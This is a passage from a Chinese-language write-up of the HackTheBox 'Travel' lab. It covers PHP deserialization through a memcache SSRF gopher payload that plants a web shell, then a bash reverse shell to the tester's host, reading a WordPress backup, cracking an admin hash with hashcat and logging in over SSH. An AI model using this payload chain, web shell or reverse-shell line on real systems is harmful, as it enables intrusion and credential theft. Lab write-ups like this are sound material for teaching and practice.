去反序列化它时，我可以在那里执行攻击。如果我将它放入我的序列化对象中，当它被反序列化时，该<code>__wakeup</code>方法会被调用，在这种情况下，它会将我设置的数据写入我设置的文件名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateHelper</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;hello.php&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateHelper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行之后会是这样：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">└─# php test.php</span><br><span class="language-xml">O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:9:&quot;hello.php&quot;;s:4:&quot;data&quot;;s:30:&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;&#125; </span><br></code></pre></td></tr></table></figure><p>这便是我的payload：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:9:&quot;hello.php&quot;;s:4:&quot;data&quot;;s:30:&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;&#125; </span><br></code></pre></td></tr></table></figure><h5 id="获取shell："><a href="#获取shell：" class="headerlink" title="获取shell："></a>获取shell：</h5><p>现在要想想怎么把它给传送到目标去。或许我可以试试通过SSRF，在谷歌上搜索“memcache SSRF”，我发现了<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>，这是一个工具包，它将帮助为各种不同的服务生成 SSRF Gopher 链接，从 mysql 到 redis 到 Python、Ruby 或 PHP 中的 memcache。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livescript">└─<span class="hljs-comment"># gopherus       </span><br><br>                                                                                                        <br>  ________              .__                                                                             <br> /  _____/  ____ ______ |  |__   ___________ __ __  ______                                              <br>/   <span class="hljs-string">\</span>  ___ /  _ <span class="hljs-string">\\____</span> <span class="hljs-string">\|</span>  |  <span class="hljs-string">\_/</span> __ <span class="hljs-string">\_</span>  __ <span class="hljs-string">\</span>  |  <span class="hljs-string">\/</span>  ___/                                              <br><span class="hljs-string">\</span>    <span class="hljs-string">\_\</span>  (  &lt;_&gt; )  |_&gt; &gt;   Y  <span class="hljs-string">\</span>  ___<span class="hljs-regexp">/|  | \/  |  /</span><span class="hljs-string">\___</span> <span class="hljs-string">\</span>                                               <br> <span class="hljs-string">\______</span>  <span class="hljs-regexp">/\____/</span>|   __<span class="hljs-regexp">/|___|  /</span><span class="hljs-string">\___</span>  &gt;__|  |____<span class="hljs-regexp">//____  &gt;                                              </span><br><span class="hljs-regexp">        \/       |__|        \/     \/                 \/                                               </span><br><span class="hljs-regexp">                                                                                                        </span><br><span class="hljs-regexp">                author: $_SpyD3r_$                                                                      </span><br><span class="hljs-regexp">                                                                                                        </span><br><span class="hljs-regexp">usage: gopherus [-h] [--exploit EXPLOIT]</span><br><span class="hljs-regexp"></span><br><span class="hljs-regexp">optional arguments:</span><br><span class="hljs-regexp">  -h, --help         show this help message and exit</span><br><span class="hljs-regexp">  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,</span><br><span class="hljs-regexp">                     pymemcache, rbmemcache, phpmemcache, dmpmemcache</span><br><span class="hljs-regexp">None</span><br></code></pre></td></tr></table></figure><p>我可以将我刚刚序列化的字符串给写进去：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs maxima">└─# gopherus --exploit phpmemcache<br><br>                                                                                                        <br>  ________              .<span class="hljs-symbol">__</span>                                                                             <br> /  _____/  ____ ______ |  |<span class="hljs-symbol">__</span>   ___________ <span class="hljs-symbol">__</span> <span class="hljs-symbol">__</span>  ______                                              <br>/   \  ___ /  <span class="hljs-symbol">_</span> \\____ \|  |  \<span class="hljs-symbol">_</span>/ <span class="hljs-symbol">__</span> \<span class="hljs-symbol">_</span>  <span class="hljs-symbol">__</span> \  |  \/  ___/                                              <br>\    \<span class="hljs-symbol">_</span>\  (  &lt;<span class="hljs-symbol">_</span>&gt; )  |<span class="hljs-symbol">_</span>&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \                                               <br> \______  /\____/|   <span class="hljs-symbol">__</span>/|___|  /\___  &gt;<span class="hljs-symbol">__</span>|  |____//____  &gt;                                              <br>        \/       |<span class="hljs-symbol">__</span>|        \/     \/                 \/                                               <br>                                                                                                        <br>                author: $_SpyD3r_$                                                                      <br>                                                                                                        <br><br>This <span class="hljs-built_in">is</span> usable when you know Class <span class="hljs-keyword">and</span> Variable name used by user<br><br>Give serialization payload<br><span class="hljs-built_in">example</span>: O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;   : O:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;TemplateHelper&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;hello.php&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">30</span>:<span class="hljs-string">&quot;&lt;?php system($_GET[&quot;</span>cmd<span class="hljs-string">&quot;]); ?&gt;&quot;</span>;&#125; <br></code></pre></td></tr></table></figure><p>便得到了以下载荷：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:11211</span>/_%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>SpyD3r%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20103</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aO:<span class="hljs-number">14</span>:%<span class="hljs-number">22</span>TemplateHelper%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:%<span class="hljs-number">7</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">9</span>:%<span class="hljs-number">22</span>hello.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">30</span>:%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>SSRF触发是在这个URL：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">blog.travel.htb<span class="hljs-regexp">/awesome-rss/</span><br></code></pre></td></tr></table></figure><p>而我序列化写入的文件根据代码提示则应该是在</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.travel.htb<span class="hljs-regexp">/wp-content/</span>themes<span class="hljs-regexp">/twentytwenty/</span>logs/hello.php<br></code></pre></td></tr></table></figure><p>因为目标对127.0.0.1有拦截，我可以将其改成0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">0</span>:<span class="hljs-number">11211</span>/_%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>SpyD3r%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20103</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aO:<span class="hljs-number">14</span>:%<span class="hljs-number">22</span>TemplateHelper%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:%<span class="hljs-number">7</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">9</span>:%<span class="hljs-number">22</span>hello.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">30</span>:%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>结合SSRF漏洞，那么我最终的payload应该是这样的:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://blog.travel.htb/awesome-rss/?debug=<span class="hljs-number">1</span>&amp;custom_feed_url=gopher://<span class="hljs-number">0</span>:<span class="hljs-number">11211</span>/_%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>SpyD3r%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20103</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aO:<span class="hljs-number">14</span>:%<span class="hljs-number">22</span>TemplateHelper%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:%<span class="hljs-number">7</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">9</span>:%<span class="hljs-number">22</span>hello.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">30</span>:%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>但是我发送之后不成功。然后我发现目标Debug中的数据是以 xct_4e5612ba07开头的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">DEBUG</span><br><span class="hljs-comment"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ </span><br><span class="hljs-comment">| xct_4e5612ba07(...) | a:4:&#123;s:5:&quot;child&quot;;a:1:&#123;s:0:&quot;&quot;;a:1:&#123;(...) |</span><br><span class="hljs-comment"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ </span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>我猜它是它自己特定url的MD5值，因为：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">└─# echo -n <span class="hljs-string">&quot;$(echo -n &#x27;http://www.travel.htb/newsfeed/customfeed.xml&#x27; | md5sum | cut -d&#x27; &#x27; -f1):spc&quot;</span> | md<span class="hljs-number">5</span>sum<br><span class="hljs-number">4e5612</span>ba<span class="hljs-number">079</span><span class="hljs-keyword">c</span><span class="hljs-number">530</span>a<span class="hljs-number">6</span>b<span class="hljs-number">1</span>f<span class="hljs-number">148</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">352241</span>  -<br></code></pre></td></tr></table></figure><p>而我本地复制的副本文件customfeed.xml的MD5值为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">└─<span class="hljs-meta">#  echo -n &quot;$(echo -n &#x27;http:<span class="hljs-comment">//10.10.16.8/customfeed.xml&#x27; | md5sum | cut -d&#x27; &#x27; -f1):spc&quot; | md5sum</span></span><br>f4e1ad391a087238d826284f5a40ecee  -<br></code></pre></td></tr></table></figure><p>然后我发现我的载荷中有工具默认的密钥SpyD3r，我试着将其改为我的MD5，那么payload实际应该是这样：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://blog.travel.htb/awesome-rss/?debug=<span class="hljs-number">1</span>&amp;custom_feed_url=gopher://<span class="hljs-number">0</span>:<span class="hljs-number">11211</span>/_%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>xct_f4e1ad391a087238d826284f5a40ecee%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20103</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aO:<span class="hljs-number">14</span>:%<span class="hljs-number">22</span>TemplateHelper%<span class="hljs-number">22</span>:<span class="hljs-number">2</span>:%<span class="hljs-number">7</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">9</span>:%<span class="hljs-number">22</span>hello.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">4</span>:%<span class="hljs-number">22</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs:<span class="hljs-number">30</span>:%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">22</span>cmd%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>先用我的payload填充缓存：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220412174003386.png" alt="image-20220412174003386"  /><p>再访问触发反序列化攻击：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl -s <span class="hljs-string">&#x27;http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=http://10.10.16.8/customfeed.xml&#x27;</span> &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>然后去访问查看文件有没有被成功写入：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">└─# curl http:<span class="hljs-comment">//blog.travel.htb/wp-content/themes/twentytwenty/logs/hello.php?cmd=id</span><br><span class="hljs-symbol">uid</span><span class="hljs-number">=33</span>(www-<span class="hljs-meta">data</span>) gid<span class="hljs-number">=33</span>(www-<span class="hljs-meta">data</span>) groups<span class="hljs-number">=33</span>(www-<span class="hljs-meta">data</span>)<br></code></pre></td></tr></table></figure><p>接下来我可以试着获取一个反向shell链接：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl -G <span class="hljs-string">&#x27;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hello.php&#x27;</span> --data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;cmd=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.8/1337 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">└─<span class="hljs-comment"># nc -lvnp 1337</span><br>listening on [any] <span class="hljs-number">1337</span> ...<br>connect to [<span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span>] from (<span class="hljs-title class_">UNKNOWN</span>) [<span class="hljs-number">10.10</span>.<span class="hljs-number">10.189</span>] <span class="hljs-number">45484</span><br><span class="hljs-symbol">bash:</span> cannot set terminal process group (<span class="hljs-number">1</span>): <span class="hljs-title class_">Inappropriate</span> ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-symbol">bash:</span> no job control <span class="hljs-keyword">in</span> this shell<br>www-data<span class="hljs-variable">@blog</span><span class="hljs-symbol">:/var/www/html/wp-content/themes/twentytwenty/logs</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><h5 id="提权探索："><a href="#提权探索：" class="headerlink" title="提权探索："></a>提权探索：</h5><p>该用户名的后缀很奇怪，我猜测我应该是在一个名为blog的容器中：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@blog</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span>hostname<br>hostname<br>blog<br>www-data<span class="hljs-variable">@blog</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span>ls -la .dockerenv<br>ls -la .dockerenv<br>-rwxr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">0</span> <span class="hljs-title class_">Apr</span> <span class="hljs-number">23</span>  <span class="hljs-number">2020</span> .dockerenv<br>www-data<span class="hljs-variable">@blog</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><p><strong>&#x2F;opt</strong>目录中找到了 wordpress 实例的备份：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@blog</span><span class="hljs-symbol">:/opt/wordpress</span><span class="hljs-variable">$ </span>ls -a<br>ls -a<br>.<br>..<br>backup<span class="hljs-number">-13</span><span class="hljs-number">-04</span><span class="hljs-number">-2020</span>.sql<br>www-data<span class="hljs-variable">@blog</span><span class="hljs-symbol">:/opt/wordpress</span><span class="hljs-variable">$ </span>cat backup<span class="hljs-number">-13</span><span class="hljs-number">-04</span><span class="hljs-number">-2020</span>.sql<br></code></pre></td></tr></table></figure><p>在备份文件的末尾，看到的admin的哈希：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">LOCK TABLES `wp_users` WRITE;<br><span class="hljs-regexp">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */</span>;<br>INSERT INTO `wp_users` VALUES (<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin@travel.htb&#x27;</span>,<span class="hljs-string">&#x27;http://localhost&#x27;</span>,<span class="hljs-string">&#x27;2020-04-13 13:19:01&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;admin&#x27;</span>),(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;lynik-admin&#x27;</span>,<span class="hljs-string">&#x27;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#x27;</span>,<span class="hljs-string">&#x27;lynik-admin&#x27;</span>,<span class="hljs-string">&#x27;lynik@travel.htb&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;2020-04-13 13:36:18&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Lynik Schmidt&#x27;</span>);<br><span class="hljs-regexp">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */</span>;<br>UNLOCK TABLES;<br><span class="hljs-regexp">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */</span>;<br><br><span class="hljs-regexp">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */</span>;<br><span class="hljs-regexp">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */</span>;<br><span class="hljs-regexp">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */</span>;<br><span class="hljs-regexp">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */</span>;<br><span class="hljs-regexp">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */</span>;<br><span class="hljs-regexp">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */</span>;<br><span class="hljs-regexp">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */</span>;<br><br>-- Dump completed on <span class="hljs-number">2020</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">31</span><br>www-data@blog:<span class="hljs-regexp">/opt/</span>wordpress$ <br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -O -D1,<span class="hljs-number">2</span> -a0 -m400 hash.txt <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">Dictionary cache hit:<br>* Filename..: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br>* Passwords.: <span class="hljs-number">14344385</span><br>* Bytes.....: <span class="hljs-number">139921507</span><br>* Keyspace..: <span class="hljs-number">14344385</span><br><br><span class="hljs-variable">$P</span><span class="hljs-variable">$B</span><span class="hljs-regexp">/wzJzd3pj/</span>n7oTe2GGpi5HcIl4ppc.:<span class="hljs-number">1</span>stepcloser   <br>Approaching final keyspace - workload adjusted.  <br></code></pre></td></tr></table></figure><p>我可以尝试ssh链接lynik-admin。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> lynik-admin@<span class="hljs-number">10.10.10.189</span>                       <br><span class="hljs-attribute">The</span> authenticity of host &#x27;<span class="hljs-number">10.10.10.189</span> (<span class="hljs-number">10.10.10.189</span>)&#x27; can&#x27;t be established.<br><span class="hljs-attribute">ED25519</span> key fingerprint is SHA256:Nt7Z0XNIx0fl2NzU79G5kFr/gbwGpuTzt7Bst14vooo.<br><span class="hljs-attribute">This</span> key is not known by any other names<br><span class="hljs-attribute">Are</span> you sure you want to continue connecting (yes/no/[fingerprint])? yes<br><span class="hljs-attribute">Warning</span>: Permanently added &#x27;<span class="hljs-number">10.10.10.189</span>&#x27; (ED25519) to the list of known hosts.<br><span class="hljs-attribute">lynik</span>-admin@<span class="hljs-number">10.10.10.189</span>&#x27;s password: <br><span class="hljs-attribute">Welcome</span> to Ubuntu <span class="hljs-number">20</span>.<span class="hljs-number">04</span> LTS (GNU/Linux <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">26</span>-generic x86_64)<br><br>  <span class="hljs-attribute">System</span> information as of Tue <span class="hljs-number">12</span> Apr <span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">08</span>:<span class="hljs-number">21</span> AM UTC<br><br>  <span class="hljs-attribute">System</span> load:                      <span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>  <span class="hljs-attribute">Usage</span> of /:                       <span class="hljs-number">46</span>.<span class="hljs-number">0</span>% of <span class="hljs-number">15</span>.<span 